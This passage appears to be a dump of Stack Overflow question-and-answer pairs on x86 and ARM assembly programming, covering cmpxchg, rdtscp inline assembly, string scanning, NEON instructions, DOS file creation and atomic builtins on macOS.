  movl  %esp, %ebp

  // edx holds dest
  movl 8(%ebp), %edx
  // eax holds expected value
  movl 12(%ebp), %eax
  // ecx holds the new value
  movl 16(%ebp), %ecx

  // cmpxchg dest_addr, exp_value
  // compare to %eax is implicit
  lock cmpxchgl %edx, %ecx

  leave
  ret
</code></pre>

<p>This is within a *.s file, which I compile with my driver program. When I include the line</p>

<pre><code>  lock cmpxchgl %edx, %ecx
</code></pre>

<p>and execute, I receive an ""Illegal instruction"" error.
When I replace the line with</p>

<pre><code>  cmpxchgl %edx, %ecx
</code></pre>

<p>my code seems to run fine.</p>

<p>First off, is <code>lock</code> necessary? I'm not sure whether <code>cmpxchgl</code> is naturally atomic, so I used <code>lock</code> to be sure. As a userland program, am I even allowed to use <code>lock</code>? </p>

<p>Thanks</p>

<p>================================================================</p>

<p>My final code (for those who may wander here in the future):</p>

<pre><code>// int cmpxchg(int *dest, int expected, int update)
.globl cmpxchg
cmpxchg:
  pushl %ebp
  movl  %esp, %ebp

  // edx holds dest, use eDx for Destination ;-)
  movl 8(%ebp), %edx
  // eax holds expected value implicitly
  movl 12(%ebp), %eax

  // cmpxchg dest_add, src_value
  lock cmpxchgl %edx, 16(%ebp)

  leave
  ret
</code></pre>
","<h3>You need <code>cmpxchgl %edx, (%ecx)</code></h3>

<p>This operation doesn't make sense unless the destination is a memory operand, however the instruction allows a register destination. The CPU will fault if the instruction uses a register mode.</p>

<p>I tried it, your code works with a memory operand. I don't know if you realize this, but this sequence (with a register destination) has a popular name: ""the f00fc7c8 bug"" or ""<a href=""http://en.wikipedia.org/wiki/F00f"" rel=""noreferrer"">the F00F bug</a>"".  In the Pentium days this was an ""HCF"" (halt and catch fire) or ""killer poke"" instruction, as it would generate an exception which it would not then be able to service because the bus was locked, and it was callable from user mode. I think there may have been an OS-level software workaround.</p>
","1746521"
"Which inline assembly code is correct for rdtscp?","5881","","<p>Disclaimer: Words cannot describe how much I detest AT&amp;T style syntax</p>

<p>I have a problem that I hope is caused by register clobbering. If not, I have a much bigger problem.</p>

<p>The first version I used was</p>

<pre><code>static unsigned long long rdtscp(void)
{
    unsigned int hi, lo;
    __asm__ __volatile__(""rdtscp"" : ""=a""(lo), ""=d""(hi));
    return (unsigned long long)lo | ((unsigned long long)hi &lt;&lt; 32);
}
</code></pre>

<p>I notice there is no 'clobbering' stuff in this version. Whether or not this is a problem I don't know... I suppose it depends if the compiler inlines the function or not. Using this version causes me problems <em>that aren't always reproducible</em>.</p>

<p>The next version I found is</p>

<pre><code>static unsigned long long rdtscp(void)
{
    unsigned long long tsc;
    __asm__ __volatile__(
        ""rdtscp;""
        ""shl $32, %%rdx;""
        ""or %%rdx, %%rax""
        : ""=a""(tsc)
        :
        : ""%rcx"", ""%rdx"");

    return tsc;
}
</code></pre>

<p>This is reassuringly unreadable and official looking, but like I said my issue isn't always reproducible so I'm merely trying to rule out one possible cause of my problem.</p>

<p>The reason I <em>believe</em> the first version is a problem is that it is overwriting a register that previously held a function parameter.</p>

<p>What's correct... version 1, or version 2, or both?</p>
","<p>Here's C++ code that will return the TSC and store the auxiliary 32-bits into the reference parameter</p>

<pre><code>static inline uint64_t rdtscp( uint32_t &amp; aux )
{
    uint64_t rax,rdx;
    asm volatile ( ""rdtscp\n"" : ""=a"" (rax), ""=d"" (rdx), ""=c"" (aux) : : );
    return (rdx &lt;&lt; 32) + rax;
}
</code></pre>

<p>It is better to do the <code>shift</code> and <code>add</code> to merge both 32-bit halves in C++ statement rather than inline, this allows the compiler to schedule those instructions as it sees fit.</p>
","14783909"
"Check null character in assembly language","5876","","<p>I am new to assembly language. To be clear, this is homework. The problem is given a char *list, how can I find which character is the end of the string?
So I have</p>

<pre><code>xor ecx, ecx; //counter
loop1:
mov esi, list;
mov eax, [esi + ecx];
cmp eax, 0x00; //check if the character is null
je end;
inc ecx;
jmp loop1;

end:
</code></pre>

<p>however, the loop does not terminate when it reaches the end of the string. I wonder what I have done wrong. I have been finding solution in books and online, but they all look like what I did. Any help will be appreciated!</p>

<p>EDIT: yes, counter should be outside of the loop.</p>
","<ul>
<li>You should not reset the counter as part of the loop.  </li>
<li>You should not initialize the address as part of the loop.  </li>
<li>The zero-termination is just a single byte but you test a complete dword.</li>
<li>The fewer jumps the better code you've written</li>
</ul>

<p>Putting all of this together we get</p>

<pre><code>  mov esi, list
  mov ecx, -1
loop1:
  inc ecx
  cmp byte [esi + ecx], 0x00; //check if the character is null
  jne loop1;
</code></pre>
","31829433"
"What is register %eiz?","5875","","<p>In the following assembly code that I dumped out using <code>objdump</code>:</p>

<pre><code>lea    0x0(%esi,%eiz,1),%esi
</code></pre>

<p>What is register <code>%eiz</code>? What does the preceding code mean?</p>
","<p>See <a href=""http://web.archive.org/web/20090523160558/http://www.blog.bit-blit.org/?p=9"" rel=""noreferrer"">Why Does GCC LEA EIZ?</a>:</p>

<blockquote>
  <p>Apparently <code>%eiz</code> is a pseudo-register that just evaluates to zero at all times (like <code>r0</code> on MIPS).</p>
</blockquote>

<p>...</p>

<blockquote>
  <p>I eventually found a mailing list post by binutils guru Ian Lance Taylor that reveals the answer. Sometimes GCC inserts NOP instructions into the code stream to ensure proper alignment and stuff like that. The NOP instruction takes one byte, so you would think that you could just add as many as needed. But according to Ian Lance Taylor, it’s faster for the chip to execute one long instruction than many short instructions. So rather than inserting seven NOP instructions, they instead use one bizarro LEA, which uses up seven bytes and is semantically equivalent to a NOP.</p>
</blockquote>
","2553556"
"How to access an integer in an array in assembly with pointer?","5868","","<p>First of all, this is a homework assignment. I was told to create a sorting function with these parameters using push and pop. They are passed in the function like this, and I don't know how to access the elements in it with ""int *list"". I'm in the middle of the process</p>

<pre><code>    int sorter (int* list, int count, int opcode)
    {
    __asm
    {
   mov eax, 0; zero out the result
   mov ebx, opcode; move opcode to ebx for comparison
   ; fill in your code here
   mov ecx, 0; set the counter to 0
   cmp ebx, 0x01; check ascendant or descendant
   je ASCENDANT
   jne DESCENDANT
   ASCENDANT:
   loop_start :
   cmp ecx, count; condition for the outer loop
   jge loop_end
   push ecx
   mov eax,
   }
   }



 loop_start:
   cmp ecx, count   ; condition for the outer loop
   jge loop_end     ; jump if end of array
   mov esi, list    ; move pointer to esi
   mov eax, [esi + 4 * ecx] ; move data that current index to eax
   push ecx         ; push ecx to the stack to save the index
   inner_loop:
     inc ecx        ; increment eax
     cmp eax, [esi + 4 * ecx]; compare eax with the next element in the array
     jle swap       ; if it is less than the current value than jump to swap
     cmp ecx, count ; check if ecx reaches the end of array
     jle inner_loop ; if not than go back to inner loop
     pop ecx        ; it ecx reaches the end than pop eax to go back to the old index of outer loop
     mov[esi + 4 * ecx], eax ; exchange the value of current eax to the element that is compared
     inc ecx        ; increment ecx for outer loop
     jmp loop_start ; jump back to loop start
     swap:          ; swap the smaller value with the current value
     mov eax, [esi + 4 * ecx] ; swapping
   jmp inner_loop   ; jump back to inner loop
 loop_end:
 ret
</code></pre>
","<p>Place the value of <code>list</code> (i.e. the address of the <code>int</code>s) in a register, and use register-indirect addressing:</p>

<pre><code>mov esi, list   
mov eax, [esi]  ; read the first element
mov eax, [esi+4]  ; read the second element
add esi, 8  ; move 2 elements ahead
mov eax, [esi]  ; read the third element
; etc...
</code></pre>

<p>If you want to swap two elements in the array specified by indices in <code>ecx</code> and <code>edx</code> you could do:</p>

<pre><code>mov eax, [esi + ecx*4]    ; eax = elem1
xchg eax, [esi + edx*4]   ; swap eax and elem2
mov [esi + ecx*4], eax    ; elem2 = old elem1
</code></pre>
","31218540"
"How many data types are there in Assembly language?","5855","","<p>In c/c++ there're too many native data types.</p>

<p>What about assembly languages?</p>
","<p>In most assembly languages, there are no data types at all.  It's entirely the programmer's responsibility to make sure that all of the code agrees on what's what.  There are still usually various directives that you can use to get specific bytes/words/etc into memory, but there's definitely no type checking of any kind.</p>
","5287727"
"How to write assembly and c code in a same .c file","5841","","<p>Is it possible to write a assembly and c code in possible?
Lets say I want to copy a chunk of data from memory and before copying I want to disable all interrupts using assembly instruction. 
Another case may be that I want add subroutine written in assembly language.</p>

<p>Please let me know all the possible ways of doing this. </p>
","<p>No, by the C standard you can't.</p>

<p>However there are compiler specific ways to do so. Check inline assembly for your compiler.</p>

<p>Or you can write the assembly you want to execute in separate .asm file as a function and then call it from C. However you will always have that call overhead.</p>

<p>On x64 there is no inline assembly. However there is one thing called intrinsics which allow you to do some things that C cannot.(They replace frequency used asm code)</p>

<p>You can read more about intrinsics here:
<a href=""http://msdn.microsoft.com/en-us/library/26td21ds.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/26td21ds.aspx</a></p>
","18395569"
"Assembly 64bit - movl, movq. Interchanging is okay?","5826","","<h3>Context:</h3>

<p>Learning GAS assembly on 64 bit linux.
Many tutorials are for 32-bit assembly.</p>

<p>Difficult to bushwhack through x86_64 assembly.</p>

<h3>Question:</h3>

<p>When I compile a c program with gcc, I still see some <code>%eax</code> and <code>movl</code>.</p>

<p>I mostly play with <code>int32_t</code>. </p>

<p>But I thought that one <em>had</em> to use the 64 bits instructions on <code>x86_64</code> (like <code>rax</code>,<code>rbx</code> and so on).</p>

<p>I don't understand very well. Shouldn't they be <code>%rax</code> and <code>movq</code> ?
In my assembly programs, I should use <code>movq</code>, right ? even for 32 bits integers ?
I am a lost beginner.</p>

<p>Thanks</p>
","<p>You can use 32 bit registers and instructions in 64 bit mode, just like you can use 16 or 8 bit too. One thing to keep in mind is that 32 bit instructions will automatically zero the top 32 bits of the respective 64 bit registers, while 16 or 8 bit instructions don't:</p>

<pre><code>movabsq $0xffffffffffffffff, %rax
movb $0, %al  # rax = 0xffffffffffffff00
movw $0, %ax  # rax = 0xffffffffffff0000
movl $0, %eax # rax = 0x0000000000000000
</code></pre>

<p>One reason to use 32 bit instructions is that they are shorter machine code.</p>
","28560686"
"ARM NEON Assembler - usage & understanding","5816","","<p>I am new to assembler and NEON programming.
My task is to convert part of an algorithm from C to ARM Assembler using NEON instructions.
The algorithm takes an int32 array, loads different values from this array, does some bitshifting and Xor and writes the result in another array.
Later I will use an array with 64bit values, but for now i just try to rewrite the code.</p>

<pre><code>C Pseudo code:

out_array[index] = shiftSome( in_array[index] ) ^ shiftSome( in_array[index] );
</code></pre>

<p>So here are my questions regarding NEON Instructions:</p>

<p>1.) If i load a register like this:</p>

<pre><code>vld1.32 d0, [r1]
</code></pre>

<p>will it load only 32Bit from the memory or 2x32Bit to fill the 64Bit Neon D-Register?</p>

<p>2.) How can I access the 2/4/8 (i32, i16, i8) parts of the D-Register?</p>

<p>3.) I am trying to load different values from the array with an offset, but it doesn't
seem to work...what am I doing wrong... here is my code:
(it is an integer array so I´m trying to load for example the 3-element, which should have an offset of 64Bit = 8 Byte)</p>

<pre><code>asm volatile(
""vld1.32 d0, [%0], #8 \n""     
""vst1.32 d0, [%1]"" : : ""r"" (a), ""r"" (out): ""d0"", ""r5"");
</code></pre>

<p>where ""a"" is the array and ""out"" is an pointer to an integer (for debugging).</p>

<p>4.) After I load a value from the array I need to shift it to the right but it doesn't seem to work:</p>

<pre><code>vshr.u32 d0, d0, #24     // C code:   x &gt;&gt; 24;
</code></pre>

<p>5.) Is it possible to only load 1 Byte in a Neon register so that I don't have to shift/mask something to get only the one Byte i need?</p>

<p>6.) I need to use Inline assembler, but I am not sure what the last line is for:</p>

<pre><code>input list : output list : what is this for?
</code></pre>

<p>7.) Do you know any good NEON References with code examples?</p>

<p>The Program should run on an Samsung Galaxy S2, cortex-A9 Processor if that makes any difference. Thanks for the help.</p>

<p><strong>----------------edit-------------------</strong></p>

<p>That is what i found out:</p>

<ol>
<li>It will always load the full Register (64Bit)</li>
<li>You can use the ""vmov"" instruction to transfer part of a neon register to an arm register.</li>
<li>The offset should be in an arm register and will be added to the
base address <strong>after</strong> the memory access.</li>
<li>It is the ""clobbered reg list"". Every Register that is used and
neither in the input or output list, should be written here.</li>
</ol>
","<p>I can answer most of your questions: (update: clarified ""lane"" issue)</p>

<p>1) NEON instructions can only load and store entire registers (64-bit, 128-bit) at a time to and from memory. There is a MOV instruction variant that allows single ""lanes"" to be moved to or from ARM registers.</p>

<p>2) You can use the NEON MOV instruction to affect single lanes. Performance will suffer when doing too many single element operations. NEON instructions benefit application performance by doing parallel operations on vectors (groups of floats/ints).</p>

<p>3) The immediate value offsets in ARM assembly language are bytes, not elements/registers. NEON instructions allow post increment with a register, not immediate value. For normal ARM instructions, your post-increment of 8 will add 8 (bytes) to the source pointer.</p>

<p>4) Shifts in NEON affect all elements of a vector. A shift right of 24 bits using vshr.u32 will shift both 32-bit unsigned longs by 24 bits and throw away the bits that get    shifted out.</p>

<p>5) NEON instructions allow moving single elements in and out of normal ARM registers, but don't allow loads or stores from memory directly into ""lanes"".</p>

<p>6) ?</p>

<p>7) Start here:  <a href=""http://blogs.arm.com/software-enablement/161-coding-for-neon-part-1-load-and-stores/"">http://blogs.arm.com/software-enablement/161-coding-for-neon-part-1-load-and-stores/</a>    The ARM site has a good tutorial on NEON.</p>
","9319931"
"Assembly code help (creating new file)","5816","","<p>I'm new in assembly. I have to do a program that copies the data of an input file to an out put file. but this output file has to be created.</p>

<p>The problem is that I cannot create this file which seems to be so straight forward.</p>

<p>the Code i am using is</p>

<pre><code>.model tiny
.data

outputfile db ""newfile.txt"",0   
outhandle dw ?  
        .code
.stack
    cseg segment 'code'
assume cs:cseg, ds:cseg
org 100h
start:
create_a_file:
 mov dx, offset outputfile
 mov cx, 0
 mov ah, 3Ch
 int 21h
 mov outhandle, ax
jc error_routine
mov ah, 3Eh
 mov bx, outhandle
 int 21h

error_routine:
mov ax, 4c00h
 int 21h
 cseg ends
end start
</code></pre>

<p>I see the new file nowhere.Even when I specify the exact root folder like ""c:...""
I cant figure out what is going wrong.
Any help is appriciated, Thanx
 PS: Im using windows XP 32-bit. and TASM (portable)</p>
","<p>If your intention is to create a .COM program, simplify the source code to this:</p>

<pre><code>cseg segment 'code'
    assume cs:cseg, ds:cseg, es:cseg, ss:cseg
    org 100h
start:

create_a_file:
    mov dx, offset outputfile
    mov cx, 0
    mov ah, 3Ch
    int 21h
    mov outhandle, ax
    jc  error_routine

    mov ah, 3Eh
    mov bx, outhandle
    int 21h

error_routine:
    mov ax, 4c00h
    int 21h

outputfile db ""newfile.txt"",0   
outhandle dw ?  

cseg ends

end start
</code></pre>

<p>Compile the program as <code>tasm.exe myprog.asm</code> and link it as <code>tlink.exe /t myprog.obj</code>. You should get <code>myprog.com</code> and it should create <code>NEWFILE.TXT</code> just fine.</p>
","8372008"
"How do I use gcc builtin __sync_bool_compare_and_swap in g++ on MacOSX?","5796","","<p>I have some code that uses:</p>

<pre><code>__sync_bool_compare_and_swap
</code></pre>

<p>it compiles fine on Linux.</p>

<p>But when I try to compile it on MacOSX in g++, I get:</p>

<pre><code>error: ‘__sync_bool_compare_and_swap’ was not declared in this scope
</code></pre>

<p>How do I fix this? (This is Mac OSX 10.5.8, so it's intel .. .and should have this instruction).</p>

<p>Thanks!</p>
","<p>If you can't find it, you can use OSCompareAndSwap() on Mac.</p>

<p>But it would be nice to have cross-platform code, wouldn't it.</p>
","2119163"